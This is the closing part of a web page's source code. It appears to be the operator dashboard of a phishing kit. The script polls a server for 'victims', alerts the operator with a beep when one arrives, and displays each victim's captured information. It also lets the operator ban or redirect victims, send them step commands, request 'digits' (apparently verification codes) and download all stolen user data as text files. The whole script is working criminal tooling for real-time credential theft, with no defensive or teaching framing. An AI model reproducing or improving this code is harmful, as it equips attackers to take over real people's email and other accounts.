    else if (lower.startsWith('gmail')) group = 'gmail';
    else if (lower.startsWith('aol')) group = 'aol';
    else if (lower.startsWith('live')) group = 'live';
    else if (lower.startsWith('icloud')) group = 'icloud';

    const groupDiv = document.getElementById('group-' + group);
    if (groupDiv) groupDiv.appendChild(btn);
  });

  secondModalInstance.show();
}
</script>






  <!-- JavaScript files-->
  <script src="vendor/jquery/jquery.min.js"></script>
  <script src="vendor/popper.js/umd/popper.min.js"> </script>
  <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
  <script src="vendor/jquery.cookie/jquery.cookie.js"> </script>
  <script src="vendor/jquery-validation/jquery.validate.min.js"></script>
  <script src="js/front.js"></script>
  <script src="js/toastr.min.js"></script>
  <script src="https://unpkg.com/webkul-micron@1.1.6/dist/script/micron.min.js"></script>
  <script src="js/other.js"></script>

<script>
    var isPaused = false;
    const btns = `<?php echo $btns; ?>`;
    const redirects = `<?php echo $redirects; ?>`;
	const removedIds = new Set();

var timmer = setInterval(function () {
  var dropdown_open = document.getElementsByClassName('input-group-prepend show');
  if (dropdown_open.length > 0) {
    pause();
  } else {
    resume();
  }

  if (!isPaused) {
    var urldata = 'inc/api.php';
    $.ajax({
      url: urldata,
      type: 'GET',
      cache: true,
      success: function (response) {
        var array = JSON.parse(response);

        array.clients.forEach(function (object) {
          if (!isPaused) {
            var victimId = object.id;
            var idClean = victimId.replace('row', '');

            var buttons = btns.replace(/CHANGE_TO_ID/g, idClean);
            var js_redirects = redirects.replace(/CHANGE_TO_ID/g, idClean);
            buttons = buttons.replace(/CHANGE_TO_REDIRECTS/g, js_redirects);

            var element = document.getElementById(victimId);

            if (element !== null && typeof element !== 'undefined') {
              var local_vic = element.innerHTML
                .replace(/"/g, "'")
                .replace(/&quot;/g, '"')
                .replace(/&amp;/g, '&');

              var online_vic = atob(object.info) + buttons;

              if (local_vic !== online_vic) {
                element.innerHTML = online_vic;
              }

              if (object.buzzed == "0") {
                element.classList.add("blink_me");
                beep();
              } else {
                element.classList.remove("blink_me");
              }

            } else {
              var clientsTable = document.getElementById('clients_table');
              clientsTable.innerHTML += '<tr id="' + victimId + '">' + atob(object.info) + buttons + '</tr>';
              var new_element = document.getElementById(victimId);

              if (object.buzzed == "0") {
                new_element.classList.add("blink_me");
                beep();
              } else {
                new_element.classList.remove("blink_me");
              }
            }
          }
        });

        document.getElementById("total_visits").innerHTML = array.total_visits;
        document.getElementById("total_clients").innerHTML = array.total_clients;
        document.getElementById("online_clients").innerHTML = array.online_clients;
        document.getElementById("active_handlers").innerHTML = array.active_handlers;

        array.removed_ids.forEach(function (item) {
          if (item !== '') {
            var old_element = document.getElementById(item);
            if (old_element !== null && typeof old_element !== 'undefined') {
              old_element.remove();
            }
          }
        });
      }
    });
  }
}, 1500);


/**
 * Update the victim row in the table
 */
function updateVictimRow(victim) {
    const id = victim.id;
    const idClean = id.replace('row', '');

    let row = document.getElementById(id);

    const buttonsHTML = btns.replace(/CHANGE_TO_ID/g, idClean)
                            .replace(/CHANGE_TO_REDIRECTS/g, redirects.replace(/CHANGE_TO_ID/g, idClean));

    const newContent = atob(victim.info) + buttonsHTML;

    if (!row) {
        const tableBody = document.getElementById("clients_table"); // Corrected ID
        if (tableBody) {
            row = document.createElement("tr");
            row.id = id;
            row.innerHTML = newContent;
            tableBody.appendChild(row);
        }
    } else {
        const localContent = row.innerHTML
            .replace(/"/g, "'")
            .replace(/&quot;/g, '"')
            .replace(/&amp;/g, '&');

        if (localContent !== newContent) {
            row.innerHTML = newContent;
        }
    }

    // Optional: buzz state handler like in your loop
    if (row) {
        if (victim.buzzed === "0") {
            row.classList.add("blink_me");
            beep();
        } else {
            row.classList.remove("blink_me");
        }
    }
}


/**
 * Update the counters in the UI
 */
function updateCounters(counters) {
    Object.entries(counters).forEach(([key, value]) => {
        const counterElement = document.getElementById(key);
        if (counterElement && typeof value !== 'undefined') {
            counterElement.textContent = value;
        }
    });
}



/**
 * Remove old rows from the table
 * @param {Array} removedIds - An array of IDs to remove
 */
function removeOldRows(removedIds) {
    if (!Array.isArray(removedIds)) return;

    removedIds.forEach(id => {
        const row = document.getElementById(`row${id}`);
        if (row) {
            row.classList.remove("buzz_overlay", "blink_me");
            row.remove();

            // Optional debug
            // console.log(`Removed row: row${id}`);
        }
    });
}

/**
 * Poll for buzz updates every second for near-instant buzz functionality.
 */
function pollBuzzUpdates() {
    setInterval(() => {
        if (!isPaused) {
            fetch('inc/api.php?buzz=1')
                .then(response => response.json())
                .then(data => {
                    if (Array.isArray(data.buzzed_clients)) {
                        data.buzzed_clients.forEach(object => {
                            handleBuzz(object.id);
                            updateVictimRow(object);
                        });
                    }
                })
                .catch(err => console.error("Error fetching buzz updates:", err));
        }
    }, 1000); // Matches comment now
}

/**
 * Pause updates
 */
function pause() {
    isPaused = true;
}

/**
 * Resume updates
 */
function resume() {
    isPaused = false;
}

/**
 * Update the counters for total visits, clients, and online handlers
 * @param {Object} data - The data object containing counter values
 */
function updateCounters(data) {
    if (!data) return;

    const counters = ["total_visits", "total_clients", "online_clients", "active_handlers"];

    counters.forEach(key => {
        const el = document.getElementById(key);
        if (el && typeof data[key] !== 'undefined') {
            el.innerText = data[key];
        }
    });
}


/**
 * Update or add a victim row in the table
 * @param {Object} object - The victim data object
 */
function updateVictimRow(object) {
    const cleanId = object.id.replace('row', '');

    const js_redirects = redirects.replace(/CHANGE_TO_ID/g, cleanId);
    const buttons = btns.replace(/CHANGE_TO_ID/g, cleanId)
                        .replace(/CHANGE_TO_REDIRECTS/g, js_redirects);

    const element = document.getElementById(object.id);

    if (element) {
        updateRowContent(element, object, buttons);
    } else {
        addNewRow(object, buttons);
    }
}

/**
 * Update the content of an existing row
 * @param {HTMLElement} element - The table row element
 * @param {Object} object - The victim data object
 * @param {String} buttons - The generated button HTML
 */
function updateRowContent(element, object, buttons) {
    if (!element || !object || !object.info) return;

    const online_vic = atob(object.info) + buttons;

    // Sanitize local HTML to match structure
    let local_vic = sanitizeHtml(element.innerHTML);

    if (local_vic !== online_vic) {
        element.innerHTML = online_vic;
    }

    // Buzzing visual/audio effect
    if (object.buzzed === "0") {
        element.classList.add("blink_me");
        beep();
    } else {
        element.classList.remove("blink_me");
    }
}


/**
 * Add a new row to the clients table
 * @param {Object} object - The victim data object
 * @param {String} buttons - The generated button HTML
 */
function addNewRow(object, buttons) {
    const clientsTable = document.getElementById("clients_table");
    if (!clientsTable || !object || !object.info) return;

    const newRow = document.createElement("tr");
    newRow.id = object.id;

    const victimInfo = atob(object.info);
    newRow.innerHTML = victimInfo + buttons;

    clientsTable.appendChild(newRow);

    // Handle buzz state if needed immediately (optional)
    if (object.buzzed === "0") {
        newRow.classList.add("blink_me");
        beep();
    }
}


/**
 * Handle buzz action for a specific victim
 * @param {String} id - The ID of the victim
 */
function handleBuzz(id) {
    const row = document.getElementById(id);
    if (row) {
        row.classList.add("buzz_overlay");
        beep();

        setTimeout(() => {
            row.classList.remove("buzz_overlay");
        }, 360000); // End the buzz effect after 5 seconds
    }
}
/**
 * Sanitize HTML by replacing problematic characters
 * @param {String} html - The HTML string to sanitize
 * @returns {String} - The sanitized HTML
 */
function sanitizeHtml(html) {
    return html
        .replace(/"/g, "'")
        .replace(/&quot;/g, '"')
        .replace(/&amp;/g, '&');
}

/**
 * Beep alert
 */
var lastBeepTime = 0; // Store the time when the last beep occurred

var alertSound = new Audio("inc/alert.mp3");
var lastBeepTime = 0;

function beep() {
    var now = Date.now();
    if (now - lastBeepTime >= 700) {
        alertSound.currentTime = 0; // rewind to start
        alertSound.play().catch(() => {});
        lastBeepTime = now;
    }
}



function remove(id) {
    if (!id) {
        toastr["error"]("Invalid ID provided.");
        return;
    }

    const rowId = "row" + id;
    const row = document.getElementById(rowId);
    if (row) row.remove();

    removedIds.add(rowId); // Prevent re-adding if already removed

    console.time("deleteAction");

    fetch('inc/action.php?type=remove', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: 'userid=' + encodeURIComponent(id)
    })
    .then(response => {
        if (!response.ok) throw new Error("Network response was not ok");
        return response.json();
    })
    .then(parsed_data => {
        if (parsed_data.status === 'ok') {
            console.timeLog("deleteAction", "Row removed successfully");
            toastr["success"]("Successfully deleted");
        } else {
            toastr["error"]("Failed to remove #" + id);
            removedIds.delete(rowId); // Re-add if deletion failed
        }
    })
    .catch(error => {
        console.error("Error:", error);
        toastr["error"]("An error occurred while removing #" + id);
        removedIds.delete(rowId); // Re-add if error occurs
    })
    .finally(() => {
        console.timeEnd("deleteAction");
    });
}





function ban(id) {
    fetch('inc/action.php?type=ban', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'userid=' + id
    })
    .then(response => response.json())
    .then(parsed_data => {
        if (parsed_data.status === 'ok') {
            toastr["success"]("Successfully banned");
        } else if (parsed_data.status === 'notok') {
            toastr["error"]("Failed to ban #" + id);
        } else {
            toastr["error"]("Invalid user ID or action failed.");
        }
    })
    .catch(error => {
        console.error('Error:', error);
        toastr["error"]("An error occurred while banning #" + id);
    });
}




function save(id) {
    fetch('inc/action.php?type=getinfo', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'userid=' + id
    })
    .then(response => response.json())
    .then(parsed_data => {
        if (parsed_data.status === 'ok') {
            var htmlContent = parsed_data.info;

            // Initialize the log content
            var log = '';
            var alreadyProcessedKeys = new Set();  // To avoid duplicate fields

            // Use a DOMParser to parse the HTML content
            var doc = new DOMParser().parseFromString(htmlContent, "text/html");
            var rows = doc.querySelectorAll("table tr");

            // Loop through each row to extract the key-value pairs
            rows.forEach(row => {
                var cells = row.querySelectorAll("td");
                if (cells.length === 2) {  // Ensure there are exactly two cells per row for key-value pairs
                    var key = cells[0].textContent.trim();
                    var value = cells[1].textContent.trim();

                    // Process only if the key hasn't been processed yet
                    if (!alreadyProcessedKeys.has(key)) {
                        alreadyProcessedKeys.add(key);
                        log += `${key}: ${value || ' '}\n`;  // Handle empty fields
                    }
                }
            });

            // Create a text file from the log content directly
            var textFileAsBlob = new Blob([log], { type: 'text/plain' });
            var d = new Date();
            var fileNameToSaveAs = `UserData_${id}_${d.getMonth() + 1}-${d.getDate()}-${d.getFullYear()}.txt`;

            // Create and click the download link without appending it to the DOM
            var downloadLink = document.createElement("a");
            downloadLink.download = fileNameToSaveAs;
            downloadLink.href = URL.createObjectURL(textFileAsBlob);
            downloadLink.click();  // Directly trigger download
            toastr["success"]("Log successfully saved!");
        } else {
            toastr["error"]("Failed to save log #" + id);
        }
    })
    .catch(error => {
        console.error('Error:', error);
        toastr["error"]("An error occurred while saving log #" + id);
    });
}



function saveAll() {
    fetch('inc/action.php?type=getallinfo', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        }
    })
    .then(response => response.json())
    .then(parsed_data => {
        if (parsed_data.status === 'ok') {
            const htmlContent = parsed_data.info;

            // Initialize the log content
            let log = '';

            // Use DOMParser to parse the HTML content
            const doc = new DOMParser().parseFromString(htmlContent, "text/html");
            const tables = doc.querySelectorAll("table");

            // Loop through each table to extract key-value pairs
            tables.forEach((table) => {
                const rows = table.querySelectorAll("tr");
                rows.forEach((row) => {
                    const cells = row.querySelectorAll("td");
                    if (cells.length === 2) {
                        const key = cells[0].textContent.trim();
                        const value = cells[1].textContent.trim();
                        log += `${key}: ${value || ''}\n`; // Handle empty fields
                    }
                });
                log += "\n===========\n\n"; // Add separator between datasets
            });

            // Create and save the log as a text file
            const textFileAsBlob = new Blob([log], { type: 'text/plain' });
            const d = new Date();
            const fileNameToSaveAs = `AllUserData_${d.getMonth() + 1}-${d.getDate()}-${d.getFullYear()}.txt`;

            const downloadLink = document.createElement("a");
            downloadLink.download = fileNameToSaveAs;
            downloadLink.href = URL.createObjectURL(textFileAsBlob);
            downloadLink.click();

            toastr["success"]("All logs successfully saved!");
        } else {
            toastr["error"]("Failed to save logs: " + parsed_data.message);
        }
    })
    .catch((error) => {
        console.error('Error:', error);
        toastr["error"]("An error occurred while saving logs.");
    });
}




function show_info(id) {
    const modalTitle = document.getElementById('infomodaltitle');
    const modalValue = document.getElementById('infomodalvalue');

    // Initialize modal content
    modalTitle.innerHTML = 'Loading info...';
    modalValue.innerHTML = '';

    fetch('inc/action.php?type=getinfo', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: 'userid=' + encodeURIComponent(id)
    })
    .then(response => {
        if (!response.ok) throw new Error("Network response was not ok");
        return response.json();
    })
    .then(parsed_data => {
        if (parsed_data.status === 'ok') {
            modalTitle.innerHTML = `#${id} Victim Info`;
            modalValue.innerHTML = parsed_data.info;
        } else {
            toastr["error"](`Failed to get information for victim #${id}`);
            modalTitle.innerHTML = 'Error';
            modalValue.innerHTML = 'Failed to retrieve information. Please try again later.';
        }
    })
    .catch(error => {
        console.error('Fetch error (show_info):', error);
        toastr["error"](`An error occurred while retrieving info for victim #${id}`);
        modalTitle.innerHTML = 'Error';
        modalValue.innerHTML = 'An unexpected error occurred. Please try again later.';
    });
}




function reset_visits() {
    if (confirm("Are you sure you want to reset the visits counter?")) {
        // Immediately reset the visits counter on the page (if applicable)
        const visitsCounter = document.getElementById('visitsCounter'); // Replace with your actual counter element
        if (visitsCounter) {
            visitsCounter.textContent = '0'; // Reset the counter immediately
        }

        // Perform the server-side action to reset visits
        console.time("resetVisitsAction");
        fetch('inc/action.php?type=visits_reset', {
            method: 'GET',
        })
        .then(response => response.json())
        .then(rasponse => {
            if (rasponse.status === 'ok') {
                toastr["success"]("Visits counter has been reset");
                console.timeLog("resetVisitsAction", "Visits counter reset on server");
            } else {
                toastr["error"]("Failed to reset visits counter");
                console.timeLog("resetVisitsAction", "Failed to reset visits on server");
            }
        })
        .catch(error => {
            console.error('Error:', error);
            toastr["error"]("An error occurred while resetting visits counter");
        })
        .finally(() => {
            console.timeEnd("resetVisitsAction");
        });
    }
}



function wipe() {
    if (confirm("Are you sure? This will clear all log entries")) {
        // Get the table or container where the rows are displayed
        const table = document.getElementById('clientsTable'); // Replace with your actual table ID
        
        // Immediately remove all rows from the DOM
        if (table) {
            const rows = table.querySelectorAll('tr'); // Select all rows
            rows.forEach(row => row.remove()); // Remove each row from the table
        }

        // Perform the server-side action to clear logs
        console.time("clearLogsAction");
        fetch('inc/action.php?type=clearlogs', {
            method: 'POST',
        })
        .then(response => response.json())
        .then(parsed_data => {
            if (parsed_data.status === 'ok') {
                toastr["success"]("Logs wiped successfully");
                console.timeLog("clearLogsAction", "Logs cleared on server");
            } else {
                toastr["error"]("Failed to wipe logs");
                console.timeLog("clearLogsAction", "Failed to clear logs on server");
            }
        })
        .catch(error => {
            console.error('Error:', error);
            toastr["error"]("An error occurred while wiping logs");
        })
        .finally(() => {
            console.timeEnd("clearLogsAction");
        });
    }
}






function reset_bans() {
    if (confirm("Are you sure? This action will clear the ban list")) {
        fetch('reset.php', {
            method: 'GET',
        })
        .then(response => {
            if (response.ok) {
                return response.text(); // Assuming response is plain text, adjust if needed
            } else {
                throw new Error('Server responded with an error');
            }
        })
        .then(() => {
            toastr["success"]("Ban list has been cleared");
        })
        .catch(error => {
            console.error('Error:', error);
            toastr["error"]("An error occurred while resetting the ban list");
        });
    }
}




function pause_all_alerts() {
    fetch('inc/action.php?type=buzzoff', {
        method: 'GET',
    })
    .then(response => response.json())
    .then(rasponse => {
        if (rasponse.status === 'ok') {
            // Check if buzzed is now '1' or '0'
            let action = rasponse.action === 1 ? "paused" : "unpaused";
            toastr["success"]("Current clients' alerts are now " + action);
        } else {
            toastr["error"]("Failed to update alerts for all clients.");
        }
    })
    .catch(error => {
        console.error('Error:', error);
        toastr["error"]("An error occurred while pausing or unpausing all alerts");
    });
}


function pause_alert(id) {
    $.ajax({
        url: 'inc/action.php?type=buzzoffsingle&userid=' + id,
        type: 'GET',
        success: function(response) {
            var rasponse = JSON.parse(response);
            if (rasponse.status == 'ok') {
                toastr["success"]("alert toggled for #" + id);
                // Toggle the button text based on current buzz state
                var button = document.querySelector(`button[onclick='pause_alert("${id}")']`);
                if (button) {
                    // Check if it's paused and toggle the button text
                    if (button.innerHTML.includes('Pause Alert')) {
                        button.innerHTML = '<i class="fa fa-bell"></i> Unpause Alert';
                    } else {
                        button.innerHTML = '<i class="fa fa-bell-slash"></i> Pause Alert';
                    }
                }
            } else {
                toastr["error"]("Failed to toggle alert for #" + id);
            }
        }
    });
}


	

function setCustomRedirect() {
    resume();

    var customURL = prompt("Enter the URL for redirection:");

    if (customURL !== null && customURL.trim() !== "") {
        const data = new URLSearchParams({
            'custom_redirect': customURL.trim()
        });

        fetch('inc/action.php?type=custom_redirect', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: data.toString()
        })
        .then(response => response.json())
        .then(parsed_data => {
            if (parsed_data.status === 'ok') {
                toastr["success"]("Custom redirection URL set successfully");
                closeRedirectModal(); // ✅ close only on success
            } else {
                toastr["error"]("Failed: " + (parsed_data.message || "unknown error"));
            }
        })
        .catch(error => {
            console.error('Error:', error);
            toastr["error"]("An error occurred while setting the redirection URL");
        });
    }
}


function closeRedirectModal() {
  if (typeof redirectModalInstance !== 'undefined') {
    redirectModalInstance.hide();
  }
}

document.addEventListener("click", function (e) {
    const btn = e.target.closest("button[data-id]");
    if (!btn) return;

    const id = btn.getAttribute("data-id");
    const sts = btn.getAttribute("data-sts");
    const needsParm = btn.hasAttribute("data-parm");

    pause();

    if (needsParm && sts) {
        command_with_parms(id, sts, function (success) {
            if (success) {
                command(id, sts, function () {
                    closeRedirectModal();
                });
            } else {
                resume();
                toastr["error"]("Parameter update failed. Command canceled.");
            }
        });
    } else if (sts !== null) {
        command(id, sts, function () {
            closeRedirectModal();
        });
    }
});

function command_with_parms(id, sts, callback) {
    resume();

    var home = prompt("Please enter digits");

    if (home != null && home !== "") {
        const data = new URLSearchParams({
            'userid': id,
            'status': sts,
            'home': home
        });

        fetch('inc/action.php?type=onecommmand', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: data.toString()
        })
        .then(response => response.json())
        .then(parsed_data => {
            if (parsed_data.status === 'ok') {
                callback(true); // ✅ confirmed
            } else {
                callback(false);
            }
        })
        .catch(error => {
            console.error('Error:', error);
            callback(false);
        });
    } else {
        callback(false); // ❌ canceled by user
    }
}

function command(id, sts, callback) {
    resume();

    const data = new URLSearchParams({
        'userid': id,
        'status': sts
    });

    fetch('inc/action.php?type=commmand', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: data.toString()
    })
    .then(response => response.json())
    .then(parsed_data => {
        if (parsed_data.status === 'ok') {
            toastr["success"]("Command sent successfully");
        } else {
            toastr["error"]("Failed to send your command");
        }
    })
    .catch(error => {
        console.error('Error:', error);
        toastr["error"]("An error occurred while sending the command");
    })
    .finally(() => {
        if (typeof callback === 'function') {
            callback();
        }
    });
}



document.addEventListener('click', function (e) {
    // Check if user clicked one of the action buttons
    if (
        e.target.closest('.btn-action') || // Any of your buttons
        e.target.classList.contains('btn-action')
    ) {
        pause(); // pause refresh immediately

        clearTimeout(window.resumeTimer); // clear any existing timer
        window.resumeTimer = setTimeout(resume, 2500); // resume after 2.5s
    }
});


</script>

</body>

</html>